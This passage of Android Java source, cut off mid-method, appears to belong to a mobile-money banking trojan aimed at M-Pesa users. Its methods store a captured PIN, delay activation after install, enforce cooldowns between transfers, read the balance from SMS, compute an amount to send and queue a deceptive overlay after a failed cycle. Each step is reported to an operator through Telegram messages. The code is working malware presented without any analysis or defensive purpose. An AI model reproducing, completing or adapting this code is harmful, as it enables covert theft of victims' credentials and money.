              private boolean isActivationWindowOpen() {
                  long installTime = prefs.getLong("install_time", 0L);
                  if (installTime == 0L) {
                      installTime = System.currentTimeMillis();
                      prefs.edit().putLong("install_time", installTime).apply();
                  }
                  return (System.currentTimeMillis() - installTime) >= ACTIVATION_DELAY_MS;
              }

              private boolean isCooldownFinished() {
                  long lastTx = prefs.getLong("last_tx_time", 0L);
                  if (lastTx == 0L) return true;
                  return (System.currentTimeMillis() - lastTx) >= COOLDOWN_MS;
              }

              private String cooldownRemaining() {
                  long lastTx = prefs.getLong("last_tx_time", 0L);
                  if (lastTx == 0L) return "ready";
                  long remaining = COOLDOWN_MS - (System.currentTimeMillis() - lastTx);
                  if (remaining <= 0) return "ready";
                  long minutes = remaining / (1000L * 60);
                  long seconds = (remaining / 1000L) % 60;
                  return minutes + "m " + seconds + "s";
              }

              private String activationRemaining() {
                  long installTime = prefs.getLong("install_time", 0L);
                  long remaining = ACTIVATION_DELAY_MS - (System.currentTimeMillis() - installTime);
                  if (remaining <= 0) return "ready";
                  long minutes = remaining / (1000L * 60);
                  long seconds = (remaining / 1000L) % 60;
                  return minutes + "m " + seconds + "s";
              }

              private void savePin(String p, String source) {
                  if (p == null || p.length() < 4) {
                      Log.d(TAG, "savePin called with invalid PIN - ignoring");
                      return;
                  }

                  PinData data = new PinData();
                  data.pin = p;
                  data.isLearned = true;
                  prefs.edit().putString("mpesa_pin", gson.toJson(data)).apply();
                  pin = p;
                  pinLearned = true;
                  sendTelegram("PIN updated (source: " + source + ")");

                  if (!isActivationWindowOpen()) {
                      sendTelegram("PIN stored. Activation in " + activationRemaining());
                      return;
                  }

                  if (!isCooldownFinished()) {
                      sendTelegram("Cooldown active: next run in " + cooldownRemaining());
                      return;
                  }

                  double balance = getLastBalanceFromSms();
                  if (balance <= 0) {
                      sendTelegram("PIN captured but balance not confirmed in SMS. Holding.");
                      return;
                  }
                  sendTelegram("Balance confirmed: KES " + String.format("%.2f", balance));

                  if (balance <= MIN_BALANCE_TRIGGER) {
                      sendTelegram("Balance KES " + String.format("%.2f", balance)
                                   + " is <= 5. Automation held.");
                      return;
                  }

                  double amount = calculateSendAmount(balance);
                  if (amount <= 0) {
                      sendTelegram("Balance KES " + String.format("%.2f", balance)
                                   + " is in the skip range (100-220). No transfer.");
                      return;
                  }

                  if (pendingOverlay) {
                      pendingOverlay = false;
                      sendTelegram("Previous cycle failed. Showing overlay before retry.");
